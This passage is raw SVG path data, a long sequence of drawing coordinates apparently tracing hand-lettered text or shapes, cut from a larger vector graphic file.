1.56-.507.107-1.294.133-2.36.08l-1.64-.12-.04-9.52-1.24-.08c-.774-.053-1.134-.213-1.08-.48.053-.267.466-.453 1.24-.56.72-.107 1.213-.44 1.48-1 .293-.56.44-1.467.44-2.72Zm5.52 4.88c-.08-.027-.507-.08-1.28-.16a21.627 21.627 0 0 0-2.36-.2c-.8-.027-1.267.067-1.4.28-.08.267-.147 1.76-.2 4.48l-.08 4.12 1.36.08c.506.027.906 0 1.2-.08.32-.08.64-.267.96-.56.373-.347.733-.947 1.08-1.8.346-.853.613-1.707.8-2.56.213-.88.32-1.68.32-2.4s-.134-1.12-.4-1.2Zm2.218-8.08c0-.427.093-.64.28-.64.187 0 .627.533 1.32 1.6.693 1.04 1.04 1.707 1.04 2 0 .56.227.533.68-.08.213-.267.44-.64.68-1.12.907-1.787 1.6-1.933 2.08-.44.16.453.32.773.48.96.187.16.453.267.8.32.613.08 1.04 0 1.28-.24.267-.267.48-.373.64-.32.16.053.24.253.24.6 0 .4-.213.72-.64.96-.4.24-.933.36-1.6.36-.427 0-.8-.107-1.12-.32-.32-.24-.533-.48-.64-.72-.107-.24-.267-.4-.48-.48-.187-.107-.387-.04-.6.2-.32.32-.573 1.653-.76 4-.16 2.347-.32 3.693-.48 4.04-.187.32-.32.96-.4 1.92a44.06 44.06 0 0 1-.28 2.56c-.107.72-.293 1.08-.56 1.08-.213 0-.347-.44-.4-1.32-.053-.88-.08-2.88-.08-6 0-4.427-.093-6.853-.28-7.28-.053-.213-.213-.4-.48-.56a1.752 1.752 0 0 1-.52-.48c-.133-.24-.2-.44-.2-.6Zm13.713-2.64c.106-.107 1.226-.12 3.36-.04 2.293.08 3.973.413 5.04 1 1.066.587 1.6 1.467 1.6 2.64 0 .72.226 1.36.68 1.92.266.373.44.827.52 1.36.08.533.12 1.6.12 3.2v.88c0 1.44-.067 2.333-.2 2.68-.107.347-.547.867-1.32 1.56-.48.453-.894.84-1.24 1.16l-1.44 1.4h-3.52c-1.654 0-2.72-.04-3.2-.12-.48-.107-1-.347-1.56-.72-1.014-.693-1.654-1.48-1.92-2.36-.267-.907-.36-2.533-.28-4.88.08-2.267.28-3.8.6-4.6.32-.8.933-1.267 1.84-1.4.613-.053 1.133-.24 1.56-.56.426-.293.986-.427 1.68-.4.72 0 1.213.147 1.48.44.266.32.226.52-.12.6-.294.107-1.107.227-2.44.36-.534.027-.934.053-1.2.08-.267.027-.56.107-.88.24-.32.107-.547.2-.68.28-.134.08-.28.267-.44.56-.134.267-.227.52-.28.76-.027.213-.067.6-.12 1.16-.054.56-.08 1.08-.08 1.56v5.92l1 .96c.48.453.933.733 1.36.84.453.107 1.573.187 3.36.24l3.76.12 1.4-1.56c.853-.933 1.373-1.68 1.56-2.24.186-.587.293-1.8.32-3.64 0-1.147-.054-2.027-.16-2.64-.107-.64-.227-1.053-.36-1.24a10.35 10.35 0 0 1-.52-.84c-.187-.4-.334-.907-.44-1.52-.134-.8-.387-1.28-.76-1.44-.347-.187-1.8-.413-4.36-.68-2.56-.293-3.84-.56-3.84-.8-.027-.08.013-.16.12-.24Zm12.107-4.64c0-.373.094-.547.28-.52.294.053.494.373.6.96a.35.35 0 0 1 .04.16c.054.533.174 1.213.36 2.04.214.8.374 1.853.48 3.16.134 1.307.2 3.093.2 5.36 0 3.467.16 5.413.48 5.84.24.32.427.453.56.4.134-.053.44-.36.92-.92.427-.48.814-1.08 1.16-1.8a73.68 73.68 0 0 1 .84-1.76c.214-.453.4-.68.56-.68.107 0 .174.04.2.12.054.053.067.173.04.36 0 .187-.04.44-.12.76-.053.293-.146.693-.28 1.2-.08.293-.4.747-.96 1.36a51.715 51.715 0 0 1-1.64 1.72c-.506.507-.76.8-.76.88 0 .053.12.107.36.16.24.027.547.16.92.4.374.213.667.573.88 1.08.214.507.414.827.6.96.187.107.587.16 1.2.16.907 0 1.56-.173 1.96-.52.32-.24.574-.36.76-.36.214-.027.307.08.28.32 0 .213-.146.467-.44.76-.293.32-.6.533-.92.64-.32.107-.826.16-1.52.16-.8 0-1.32-.053-1.56-.16-.24-.133-.52-.467-.84-1-.426-.693-.866-1.067-1.32-1.12-.453-.053-.813.24-1.08.88-.213.587-.253 1.613-.12 3.08.187 1.867.054 3-.4 3.4a.363.363 0 0 1-.4 0c-.213-.133-.32-1.307-.32-3.52 0-1.307-.04-2.227-.12-2.76-.08-.533-.226-.92-.44-1.16-.24-.267-.36-.467-.36-.6 0-.133.12-.333.36-.6.24-.267.387-.84.44-1.72.08-.907.12-2.88.12-5.92 0-4.667-.173-7.6-.52-8.8-.32-1.2-.48-2-.48-2.4Zm14.424 7.96c.613-.16 1.466-.2 2.56-.12 1.12.053 1.786.187 2 .4.213.213.373.787.48 1.72.08.64.053 1.12-.08 1.44-.107.293-.4.72-.88 1.28-.454.507-.867.867-1.24 1.08-.347.187-.894.347-1.64.48-1.6.24-2.347.093-2.24-.44 0-.053.026-.133.08-.24.16-.24.746-.36 1.76-.36.586 0 1.04-.053 1.36-.16.346-.133.706-.373 1.08-.72.48-.453.773-1.027.88-1.72.106-.693-.014-1.227-.36-1.6-.454-.453-1.507-.507-3.16-.16-1.654.32-2.6.787-2.84 1.4-.16.347-.294 1.773-.4 4.28l-.161 3.76 2.401 2.32 4.04.16c2.853.107 4.213.267 4.08.48-.107.213-1.52.32-4.24.32h-4.2l-3-2.92v-3.48c0-2.48.253-4.213.76-5.2.506-.987 1.493-1.653 2.96-2ZM52.964 222c.373-.56.626-.427.76.4.106.88.146 2.987.12 6.32-.027 4.613-.134 7.453-.32 8.52-.56 3.12-1.067 4.907-1.52 5.36-.187.213-.374.293-.56.24-.16-.08-.467-.333-.92-.76-.56-.533-1.187-1.427-1.88-2.68-.694-1.253-1.294-2.2-1.8-2.84a17.176 17.176 0 0 1-1.72-2.68c-.507-1.04-.76-1.787-.76-2.24-.027-.507-.307-1.053-.84-1.64-.534-.613-.96-.853-1.28-.72-.347.107-.52.333-.52.68 0 .347-.227.88-.68 1.6-.294.48-.48 1.293-.56 2.44-.054 1.147-.08 4.253-.08 9.32 0 4.267-.027 7.133-.08 8.6-.054 1.493-.174 2.307-.36 2.44-.294.24-.52.293-.68.16-.16-.187-.227-3.24-.2-9.16.053-5.92.173-9.413.36-10.48.213-1.28.506-2.533.88-3.76.373-1.227.706-2.013 1-2.36.693-.693 1.36-.72 2-.08.64.64 1.186 1.427 1.64 2.36.453.907.68 1.493.68 1.76 0 .187.493 1.013 1.48 2.48.986 1.44 1.533 2.333 1.64 2.68.08.293.293.627.64 1 .346.373.52.707.52 1 0 .347.2.72.6 1.12.426.4.746.533.96.4.4-.24.68-1.173.84-2.8.16-1.653.266-4.387.32-8.2.026-5.36.133-8.187.32-8.48Zm5.105 7.12c.107-.107 1.227-.12 3.36-.04 2.294.08 3.974.413 5.04 1 1.067.587 1.6 1.467 1.6 2.64 0 .72.227 1.36.68 1.92.267.373.44.827.52 1.36.08.533.12 1.6.12 3.2v.88c0 1.44-.066 2.333-.2 2.68-.106.347-.546.867-1.32 1.56-.48.453-.893.84-1.24 1.16l-1.44 1.4h-3.52c-1.653 0-2.72-.04-3.2-.12-.48-.107-1-.347-1.56-.72-1.013-.693-1.653-1.48-1.92-2.36-.266-.907-.36-2.533-.28-4.88.08-2.267.28-3.8.6-4.6.32-.8.934-1.267 1.84-1.4.614-.053 1.134-.24 1.56-.56.427-.293.987-.427 1.68-.4.72 0 1.214.147 1.48.44.267.32.227.52-.12.6-.293.107-1.106.227-2.44.36-.533.027-.933.053-1.2.08-.266.027-.56.107-.88.24-.32.107-.546.2-.68.28-.133.08-.28.267-.44.56-.133.267-.226.52-.28.76-.026.213-.066.6-.12 1.16-.053.56-.08 1.08-.08 1.56v5.92l1 .96c.48.453.934.733 1.36.84.454.107 1.574.187 3.36.24l3.76.12 1.4-1.56c.854-.933 1.374-1.68 1.56-2.24.187-.587.294-1.8.32-3.64 0-1.147-.053-2.027-.16-2.64-.106-.64-.226-1.053-.36-1.24a10.672 10.672 0 0 1-.52-.84c-.186-.4-.333-.907-.44-1.52-.133-.8-.386-1.28-.76-1.44-.346-.187-1.8-.413-4.36-.68-2.56-.293-3.84-.56-3.84-.8-.026-.08.014-.16.12-.24Zm22.148 3.84c.4-.853.72-1.16.96-.92.16.267.214.52.16.76-.053.213-.16.493-.32.84-.16.32-.24.533-.24.64 0 .08.8.12 2.4.12 1.627 0 2.574.16 2.84.48.4.48.147.733-.76.76-.453.027-1.12 0-2-.08-1.253-.107-2-.133-2.24-.08-.213.053-.4.293-.56.72-.213.587-.32 2.293-.32 5.12 0 2.64.147 4.12.44 4.44.214.213.667.173 1.36-.12.507-.24.84-.253 1-.04.187.293.094.587-.28.88-.373.267-.84.4-1.4.4-.666 0-1.146-.16-1.44-.48-.293-.32-.48-.907-.56-1.76-.08-.853-.106-2.267-.08-4.24l.12-4.84-4.6-.16c-3.146-.107-4.653-.28-4.52-.52.134-.213 1.707-.373 4.72-.48l4.72-.16.6-1.28Zm28.433 17.2c.293 0 .573-.107.84-.32.267-.24.813-.36 1.64-.36 1.867 0 3.013-.92 3.44-2.76.24-1.067.333-2.52.28-4.36-.027-1.867-.173-3.133-.44-3.8l-.48-1.2h-2.76c-1.84 0-2.88-.147-3.12-.44-.267-.32-.293-1-.08-2.04.24-1.04.587-1.813 1.04-2.32.32-.347.627-.56.92-.64.293-.08.8-.107 1.52-.08 1.093.08 1.64.28 1.64.6 0 .32-.547.52-1.64.6-.933.053-1.573.24-1.92.56-.347.32-.52.88-.52 1.68v1.08h2.56c1.28 0 2.147.093 2.6.28.48.187.72.52.72 1 0 .293.213.72.64 1.28.613.773.827 2.227.64 4.36-.187 2.133-.693 3.947-1.52 5.44-.48.88-2.213 1.587-5.2 2.12-2.587.427-4.013.213-4.28-.64-.027-.107-.213-.547-.56-1.32a9.863 9.863 0 0 1-.72-2.24c-.08-.56-.093-.947-.04-1.16.053-.213.213-.4.48-.56 1.067-.56 2.027-.413 2.88.44.347.347.56.693.64 1.04.107.347.16.933.16 1.76 0 .88.04 1.44.12 1.68.08.213.253.32.52.32Zm-1.92-2.12c-.08-1.147-.213-1.827-.4-2.04a.996.996 0 0 0-.72-.4c-.267-.053-.48 0-.64.16-.187.187-.187.693 0 1.52.213.827.493 1.493.84 2 .427.613.707.853.84.72.16-.16.187-.813.08-1.96Zm10.322-8.24c0-1.333.014-2.373.04-3.12a31.39 31.39 0 0 1 .12-1.96c.054-.533.134-.88.24-1.04.107-.16.24-.187.4-.08.187.107.254.947.2 2.52l-.16 4.72c-.053 1.6.067 2.96.36 4.08.027.053.054.12.08.2.16.48.334.827.52 1.04.214.187.72.347 1.52.48s2.054.2 3.76.2c.614 0 1.107-.013 1.48-.04a3.31 3.31 0 0 0 1.04-.24c.347-.133.6-.293.76-.48.16-.187.307-.493.44-.92.16-.427.267-.88.32-1.36.08-.48.174-1.147.28-2 .24-2.347.227-3.733-.04-4.16-.16-.213-.28-.533-.36-.96a5.557 5.557 0 0 1-.04-1.12c.054-.32.16-.48.32-.48.427 0 .707.373.84 1.12.16.72.227 2.16.2 4.32l-.04 4.4-2.48 3.04-3.72-.24a76.998 76.998 0 0 1-1.96-.08 18.547 18.547 0 0 1-1.48-.24c-.506-.133-.88-.253-1.12-.36-.213-.107-.453-.32-.72-.64-.24-.347-.4-.653-.48-.92-.053-.267-.12-.72-.2-1.36-.08-.667-.12-1.28-.12-1.84v-2.48Zm13.125-8.04c0-.427.094-.64.28-.64.187 0 .627.533 1.32 1.6.694 1.04 1.04 1.707 1.04 2 0 .56.227.533.68-.08.214-.267.44-.64.68-1.12.907-1.787 1.6-1.933 2.08-.44.16.453.32.773.48.96.187.16.454.267.8.32.614.08 1.04 0 1.28-.24.267-.267.48-.373.64-.32.16.053.24.253.24.6 0 .4-.213.72-.64.96-.4.24-.933.36-1.6.36-.426 0-.8-.107-1.12-.32-.32-.24-.533-.48-.64-.72-.106-.24-.266-.4-.48-.48-.186-.107-.386-.04-.6.2-.32.32-.573 1.653-.76 4-.16 2.347-.32 3.693-.48 4.04-.186.32-.32.96-.4 1.92a44.06 44.06 0 0 1-.28 2.56c-.106.72-.293 1.08-.56 1.08-.213 0-.346-.44-.4-1.32-.053-.88-.08-2.88-.08-6 0-4.427-.093-6.853-.28-7.28-.053-.213-.213-.4-.48-.56a1.76 1.76 0 0 1-.52-.48c-.133-.24-.2-.44-.2-.6Zm14.033.68c.613-.16 1.467-.2 2.56-.12 1.12.053 1.787.187 2 .4.213.213.373.787.48 1.72.08.64.053 1.12-.08 1.44-.107.293-.4.72-.88 1.28-.453.507-.867.867-1.24 1.08-.347.187-.893.347-1.64.48-1.6.24-2.347.093-2.24-.44 0-.053.027-.133.08-.24.16-.24.747-.36 1.76-.36.587 0 1.04-.053 1.36-.16.347-.133.707-.373 1.08-.72.48-.453.773-1.027.88-1.72.107-.693-.013-1.227-.36-1.6-.453-.453-1.507-.507-3.16-.16-1.653.32-2.6.787-2.84 1.4-.16.347-.293 1.773-.4 4.28l-.16 3.76 2.4 2.32 4.04.16c2.853.107 4.213.267 4.08.48-.107.213-1.52.32-4.24.32h-4.2l-3-2.92v-3.48c0-2.48.253-4.213.76-5.2.507-.987 1.493-1.653 2.96-2Zm-120.286 46.6c.533-.213 1.227-.293 2.08-.24.88.027 1.613.187 2.2.48.747.347 1.173.64 1.28.88.107.24-.053.573-.48 1-.32.347-.52.8-.6 1.36-.053.533-.053 1.893 0 4.08.08 3.147.293 4.747.64 4.8.16.027.427-.24.8-.8.027-.08.067-.16.12-.24.48-.773.853-1.067 1.12-.88.16.133.173.48.04 1.04-.32 1.333-1.067 2-2.24 2-.667 0-1.147-.147-1.44-.44-.267-.293-.4-.773-.4-1.44 0-.72-.067-1.08-.2-1.08s-.813.547-2.04 1.64c-.827.72-1.52 1.187-2.08 1.4-.533.213-.933.253-1.2.12a17.057 17.057 0 0 0-1.2-.52 3.875 3.875 0 0 0-1.68-.36c-.48 0-.813-.067-1-.2-.187-.133-.387-.453-.6-.96-.613-1.413-.627-3.573-.04-6.48.187-.987.373-1.667.56-2.04.213-.4.587-.84 1.12-1.32.587-.48 1.187-.813 1.8-1a9.19 9.19 0 0 1 1.88-.44c.667-.107 1.187-.227 1.56-.36Zm3.96 1.04c-.107-.187-.747-.293-1.92-.32-1.147-.053-1.813 0-2 .16-.053.08-.693.253-1.92.52-1.2.24-2.107.587-2.72 1.04-.453.347-.773.707-.96 1.08-.16.347-.32.96-.48 1.84a23.728 23.728 0 0 0-.36 3.96c0 1.227.133 1.92.4 2.08.4.24 1.133.533 2.2.88 1.093.347 1.827.52 2.2.52.48 0 1.213-.587 2.2-1.76 1.013-1.2 1.52-2.08 1.52-2.64 0-.267.027-.467.08-.6.08-.16.16-.293.24-.4.107-.107.227-.4.36-.88.133-.48.24-1.12.32-1.92a19.23 19.23 0 0 1 .36-1.92c.133-.533.24-.853.32-.96.08-.107.147-.24.2-.4.053-.16.04-.253-.04-.28Zm7.27-1.12c0-.96.16-1.973.48-3.04.346-1.093.52-2.227.52-3.4 0-1.467.066-2.267.2-2.4.16-.133.346-.133.56 0 .213.133.226 1.147.04 3.04-.16 1.893-.374 3.053-.64 3.48-.294.427-.467 1.453-.52 3.08l-.12 2.48 2.16.2c1.44.133 2.506.387 3.2.76.453.24.733.467.84.68.133.213.2.68.2 1.4a6.37 6.37 0 0 1-.52 2.48c-.32.8-.48 1.413-.48 1.84 0 .56-.334 1.307-1 2.24-.64.907-1.214 1.427-1.72 1.56-.507.107-1.294.133-2.36.08l-1.64-.12-.04-9.52-1.24-.08c-.774-.053-1.134-.213-1.08-.48.053-.267.466-.453 1.24-.56.72-.107 1.213-.44 1.48-1 .293-.56.44-1.467.44-2.72Zm5.52 4.88c-.08-.027-.507-.08-1.28-.16a21.631 21.631 0 0 0-2.36-.2c-.8-.027-1.267.067-1.4.28-.08.267-.147 1.76-.2 4.48l-.08 4.12 1.36.08c.506.027.906 0 1.2-.08.32-.08.64-.267.96-.56.373-.347.733-.947 1.08-1.8.346-.853.613-1.707.8-2.56.213-.88.32-1.68.32-2.4s-.134-1.12-.4-1.2Zm5.618-10.72c.107-.107 1.227-.12 3.36-.04 2.294.08 3.974.413 5.04 1 1.067.587 1.6 1.467 1.6 2.64 0 .72.227 1.36.68 1.92.267.373.44.827.52 1.36.08.533.12 1.6.12 3.2v.88c0 1.44-.067 2.333-.2 2.68-.106.347-.547.867-1.32 1.56-.48.453-.893.84-1.24 1.16l-1.44 1.4h-3.52c-1.653 0-2.72-.04-3.2-.12-.48-.107-1-.347-1.56-.72-1.013-.693-1.653-1.48-1.92-2.36-.267-.907-.36-2.533-.28-4.88.08-2.267.28-3.8.6-4.6.32-.8.934-1.267 1.84-1.4.614-.053 1.133-.24 1.56-.56.427-.293.987-.427 1.68-.4.72 0 1.213.147 1.48.44.267.32.227.52-.12.6-.293.107-1.107.227-2.44.36-.533.027-.933.053-1.2.08-.267.027-.56.107-.88.24-.32.107-.546.2-.68.28-.133.08-.28.267-.44.56a3.33 3.33 0 0 0-.28.76c-.026.213-.066.6-.12 1.16-.053.56-.08 1.08-.08 1.56v5.92l1 .96c.48.453.934.733 1.36.84.453.107 1.573.187 3.36.24l3.76.12 1.4-1.56c.854-.933 1.373-1.68 1.56-2.24.187-.587.294-1.8.32-3.64 0-1.147-.053-2.027-.16-2.64-.106-.64-.227-1.053-.36-1.24a10.642 10.642 0 0 1-.52-.84c-.187-.4-.333-.907-.44-1.52-.133-.8-.386-1.28-.76-1.44-.346-.187-1.8-.413-4.36-.68-2.56-.293-3.84-.56-3.84-.8-.026-.08.014-.16.12-.24ZM58.4 283.8c0-1.333.013-2.373.04-3.12a31.39 31.39 0 0 1 .12-1.96c.053-.533.133-.88.24-1.04.107-.16.24-.187.4-.08.187.107.253.947.2 2.52-.053 1.547-.107 3.12-.16 4.72-.053 1.6.067 2.96.36 4.08.027.053.053.12.08.2.16.48.333.827.52 1.04.213.187.72.347 1.52.48s2.053.2 3.76.2c.613 0 1.107-.013 1.48-.04.373-.027.72-.107 1.04-.24.347-.133.6-.293.76-.48.16-.187.307-.493.44-.92.16-.427.267-.88.32-1.36.08-.48.173-1.147.28-2 .24-2.347.227-3.733-.04-4.16-.16-.213-.28-.533-.36-.96a5.484 5.484 0 0 1-.04-1.12c.053-.32.16-.48.32-.48.427 0 .707.373.84 1.12.16.72.227 2.16.2 4.32l-.04 4.4-2.48 3.04-3.72-.24a76.796 76.796 0 0 1-1.96-.08 18.475 18.475 0 0 1-1.48-.24c-.507-.133-.88-.253-1.12-.36-.213-.107-.453-.32-.72-.64-.24-.347-.4-.653-.48-.92-.053-.267-.12-.72-.2-1.36-.08-.667-.12-1.28-.12-1.84v-2.48Zm23.165-6.84c.4-.853.72-1.16.96-.92.16.267.213.52.16.76-.053.213-.16.493-.32.84-.16.32-.24.533-.24.64 0 .08.8.12 2.4.12 1.627 0 2.573.16 2.84.48.4.48.147.733-.76.76-.453.027-1.12 0-2-.08-1.253-.107-2-.133-2.24-.08-.213.053-.4.293-.56.72-.213.587-.32 2.293-.32 5.12 0 2.64.147 4.12.44 4.44.213.213.667.173 1.36-.12.507-.24.84-.253 1-.04.187.293.093.587-.28.88-.373.267-.84.4-1.4.4-.667 0-1.147-.16-1.44-.48-.293-.32-.48-.907-.56-1.76-.08-.853-.107-2.267-.08-4.24l.12-4.84-4.6-.16c-3.147-.107-4.653-.28-4.52-.52.133-.213 1.707-.373 4.72-.48l4.72-.16.6-1.28Zm28.433 17.2c.293 0 .573-.107.84-.32.266-.24.813-.36 1.64-.36 1.866 0 3.013-.92 3.44-2.76.24-1.067.333-2.52.28-4.36-.027-1.867-.174-3.133-.44-3.8l-.48-1.2h-2.76c-1.84 0-2.88-.147-3.12-.44-.267-.32-.294-1-.08-2.04.24-1.04.586-1.813 1.04-2.32.32-.347.626-.56.92-.64.293-.08.8-.107 1.52-.08 1.093.08 1.64.28 1.64.6 0 .32-.547.52-1.64.6-.934.053-1.574.24-1.92.56-.347.32-.52.88-.52 1.68v1.08h2.56c1.28 0 2.146.093 2.6.28.48.187.72.52.72 1 0 .293.213.72.64 1.28.613.773.826 2.227.64 4.36-.187 2.133-.694 3.947-1.52 5.44-.48.88-2.214 1.587-5.2 2.12-2.587.427-4.014.213-4.28-.64-.027-.107-.214-.547-.56-1.32a9.863 9.863 0 0 1-.72-2.24c-.08-.56-.094-.947-.04-1.16.053-.213.213-.4.48-.56 1.066-.56 2.026-.413 2.88.44.346.347.56.693.64 1.04.106.347.16.933.16 1.76 0 .88.04 1.44.12 1.68.08.213.253.32.52.32Zm-1.92-2.12c-.08-1.147-.214-1.827-.4-2.04a.996.996 0 0 0-.72-.4c-.267-.053-.48 0-.64.16-.187.187-.187.693 0 1.52.213.827.493 1.493.84 2 .426.613.706.853.84.72.16-.16.186-.813.08-1.96Zm14.042-15.6c.613-.16 1.467-.2 2.56-.12 1.12.053 1.787.187 2 .4.213.213.373.787.48 1.72.08.64.053 1.12-.08 1.44-.107.293-.4.72-.88 1.28-.453.507-.867.867-1.24 1.08-.347.187-.893.347-1.64.48-1.6.24-2.347.093-2.24-.44 0-.053.027-.133.08-.24.16-.24.747-.36 1.76-.36.587 0 1.04-.053 1.36-.16.347-.133.707-.373 1.08-.72.48-.453.773-1.027.88-1.72.107-.693-.013-1.227-.36-1.6-.453-.453-1.507-.507-3.16-.16-1.653.32-2.6.787-2.84 1.4-.16.347-.293 1.773-.4 4.28l-.16 3.76 2.4 2.32 4.04.16c2.853.107 4.213.267 4.08.48-.107.213-1.52.32-4.24.32h-4.2l-3-2.92v-3.48c0-2.48.253-4.213.76-5.2.507-.987 1.493-1.653 2.96-2Zm10.027-3.76c.106-.347.2-.72.28-1.12.106-.4.173-.693.2-.88.053-.213.106-.413.16-.6.08-.187.146-.32.2-.4.08-.08.16-.12.24-.12.133 0 .2.107.2.32 0 .187-.04.587-.12 1.2-.027.267-.054.493-.08.68-.027.187-.067.453-.12.8-.027.32-.067.68-.12 1.08-.027.373-.067.76-.12 1.16a36.933 36.933 0 0 1-.48 3.6c-.214 1.12-.374 2.4-.48 3.84-.107 1.413-.187 3.667-.24 6.76-.054 3.307-.067 5.387-.04 6.24.053.853.2 1.32.44 1.4.373.16.813-.027 1.32-.56.506-.533.88-1.2 1.12-2 .4-1.2.666-1.8.8-1.8.053 0 .133.053.24.16.293.293.253.907-.12 1.84a9.876 9.876 0 0 1-1.56 2.56c-.667.827-1.227 1.24-1.68 1.24-.16 0-.36-.08-.6-.24a2.057 2.057 0 0 1-.52-.56c-.214-.32-.347-.947-.4-1.88-.054-.933-.054-2.893 0-5.88.08-3.413.253-6.747.52-10 .293-3.253.613-5.533.96-6.84Zm5.937 0c.107-.347.2-.72.28-1.12.107-.4.173-.693.2-.88.053-.213.107-.413.16-.6.08-.187.147-.32.2-.4.08-.08.16-.12.24-.12.133 0 .2.107.2.32 0 .187-.04.587-.12 1.2-.027.267-.053.493-.08.68-.027.187-.067.453-.12.8-.027.32-.067.68-.12 1.08-.027.373-.067.76-.12 1.16a36.933 36.933 0 0 1-.48 3.6c-.213 1.12-.373 2.4-.48 3.84-.107 1.413-.187 3.667-.24 6.76-.053 3.307-.067 5.387-.04 6.24.053.853.2 1.32.44 1.4.373.16.813-.027 1.32-.56.507-.533.88-1.2 1.12-2 .4-1.2.667-1.8.8-1.8.053 0 .133.053.24.16.293.293.253.907-.12 1.84a9.822 9.822 0 0 1-1.56 2.56c-.667.827-1.227 1.24-1.68 1.24-.16 0-.36-.08-.6-.24a2.073 2.073 0 0 1-.52-.56c-.213-.32-.347-.947-.4-1.88-.053-.933-.053-2.893 0-5.88.08-3.413.253-6.747.52-10 .293-3.253.613-5.533.96-6.84Zm4.458 14.84c-.054-3.547-.054-5.787 0-6.72.053-.933.186-1.4.4-1.4.213 0 .346.44.4 1.32.053.88.08 2.96.08 6.24v3.68c.026.933.053 1.693.08 2.28.053.587.106.987.16 1.2.053.213.12.307.2.28.186-.053.466-.413.84-1.08a8.7 8.7 0 0 0 .88-1.92c.106-.427.266-.533.48-.32.293.293.28.84-.04 1.64a6.18 6.18 0 0 1-1.36 2.16c-.587.64-1.094.92-1.52.84-.24-.053-.4-.533-.48-1.44-.054-.907-.094-3.16-.12-6.76Zm2.04-15.32c-.32 0-.48-.107-.48-.32 0-.24.16-.36.48-.36.32 0 .48.12.48.36 0 .213-.16.32-.48.32Zm4.09 16.04c.133 0 .413-.293.84-.88.427-.613.92-1.213 1.48-1.8.56-.613 1.093-.92 1.6-.92.533 0 1.32.52 2.36 1.56.747.773 1.2 1.347 1.36 1.72.187.347.333 1.107.44 2.28.16 1.573.453 2.573.88 3 .4.427.72.627.96.6.24-.053.467-.347.68-.88.293-.747.507-1.24.64-1.48.16-.267.347-.44.56-.52.32-.107.427.107.32.64-.213.933-.68 1.827-1.4 2.68-.293.373-.547.56-.76.56-.72 0-1.32-.44-1.8-1.32-.453-.907-.947-2.547-1.48-4.92-.107-.48-.533-1.08-1.28-1.8-.747-.747-1.32-1.12-1.72-1.12-.587 0-1.347.8-2.28 2.4-.907 1.573-1.427 2.987-1.56 4.24-.16 1.6-.347 2.4-.56 2.4-.08 0-.2-.067-.36-.2-.347-.267-.52-1.667-.52-4.2 0-2.533.173-4.44.52-5.72.32-1.28.48-2.227.48-2.84s.067-.987.2-1.12c.347-.32.573-.187.68.4.053.32.04.707-.04 1.16-.133.853-.24 1.76-.32 2.72-.08.96-.12 1.76-.12 2.4.027.64.093.96.2.96Zm22.49 4.76c0-.4.16-.787.48-1.16.32-.373.48-.747.48-1.12 0-.293-.146-.52-.44-.68-.293-.187-.96-.44-2-.76-1.653-.48-2.946-.72-3.88-.72-1.013 0-1.96-.32-2.84-.96-.88-.667-1.32-1.387-1.32-2.16 0-.373.734-1.307 2.2-2.8 1.494-1.493 2.414-2.253 2.76-2.28.294 0 .774-.213 1.44-.64.507-.347.894-.52 1.16-.52.294 0 .96.2 2 .6.614.213 1.24.587 1.88 1.12.667.507 1 .893 1 1.16 0 .347-.546.173-1.64-.52a5.024 5.024 0 0 0-.56-.4c-.986-.72-2.093-.907-3.32-.56-1.226.32-2.653 1.213-4.28 2.68-.773.693-1.253 1.187-1.44 1.48-.16.267-.2.587-.12.96.134.507.507.947 1.12 1.32.64.373 1.32.56 2.04.56.694 0 1.427.16 2.2.48.72.293 1.547.453 2.48.48.934.027 1.547-.093 1.84-.36.24-.267.36-1.147.36-2.64 0-1.84.254-2.667.76-2.48.134.027.294.16.48.4.24.347.374 1 .4 1.96.054.96-.04 1.507-.28 1.64-.186.107-.32.453-.4 1.04-.08.56-.24 1.333-.48 2.32a9.854 9.854 0 0 1-1.16 2.8c-.613 1.067-.92 1.68-.92 1.84 0 .187-.426.733-1.28 1.64-.586.64-1.026 1.027-1.32 1.16-.266.133-.72.173-1.36.12-.693-.027-1.133-.133-1.32-.32-.16-.16-.4-.68-.72-1.56a28.988 28.988 0 0 0-.48-1.4c-.16-.533-.28-.893-.36-1.08a4.852 4.852 0 0 0-.24-.64 4.085 4.085 0 0 0-.4-.76c-.346-.507-.4-.88-.16-1.12.24-.24.44-.147.6.28.027.08.267.627.72 1.64.454.987.747 1.813.88 2.48.16.8.387 1.32.68 1.56.32.293.867.253 1.64-.12.774-.373 1.307-.84 1.6-1.4.187-.373.48-.8.88-1.28.427-.48.64-.907.64-1.28ZM85.68 335.2c.453-.373.76-.573.92-.6.16-.027.413.053.76.24.32.213.36.507.12.88-.667 1.12-1.334 1.347-2 .68-.294-.267-.427-.453-.4-.56.026-.133.226-.347.6-.64Zm.52-12.64c.453-.347.893-.48 1.32-.4.426.08.64.32.64.72 0 .427-.294.72-.88.88-.587.16-1.014.067-1.28-.28-.187-.187-.267-.333-.24-.44.026-.133.173-.293.44-.48Zm17.547-2.56c.187-.427.507-.947.96-1.56.453-.64.76-.96.92-.96.347 0 .333.347-.04 1.04-.8 1.333-1.267 2.147-1.4 2.44-.267.587-.587 1.067-.96 1.44-.347.347-.52.613-.52.8 0 .24-.333.8-1 1.68-.667.88-1.053 1.507-1.16 1.88-.24.773-1.08 2.187-2.52 4.24-1.44 2.027-2.427 3.213-2.96 3.56-.187.133-.413.467-.68 1-1.147 2.16-2.213 3.947-3.2 5.36-.987 1.44-1.653 2.16-2 2.16-.32 0-.334-.253-.04-.76.32-.48.84-1.24 1.56-2.28.72-1.013 1.28-1.92 1.68-2.72a19.749 19.749 0 0 1 2.84-4.2c1.173-1.307 1.986-2.307 2.44-3l1.48-2.2c.4-.587.6-1.093.6-1.52 0-.453.12-.76.36-.92.187-.107.787-.92 1.8-2.44 1.04-1.547 1.653-2.56 1.84-3.04ZM97.593 5c.373-.56.626-.427.76.4.106.88.146 2.987.12 6.32-.027 4.613-.134 7.453-.32 8.52-.56 3.12-1.067 4.907-1.52 5.36-.187.213-.374.293-.56.24-.16-.08-.467-.333-.92-.76-.56-.533-1.187-1.427-1.88-2.68-.694-1.253-1.294-2.2-1.8-2.84a17.176 17.176 0 0 1-1.72-2.68c-.507-1.04-.76-1.787-.76-2.24-.027-.507-.307-1.053-.84-1.64-.534-.613-.96-.853-1.28-.72-.347.107-.52.333-.52.68 0 .347-.227.88-.68 1.6-.294.48-.48 1.293-.56 2.44-.054 1.147-.08 4.253-.08 9.32 0 4.267-.027 7.133-.08 8.6-.054 1.493-.174 2.307-.36 2.44-.294.24-.52.293-.68.16-.16-.187-.227-3.24-.2-9.16.053-5.92.173-9.413.36-10.48a29.63 29.63 0 0 1 .88-3.76c.373-1.227.706-2.013 1-2.36.693-.693 1.36-.72 2-.08.64.64 1.186 1.427 1.64 2.36.453.907.68 1.493.68 1.76 0 .187.493 1.013 1.48 2.48.986 1.44 1.533 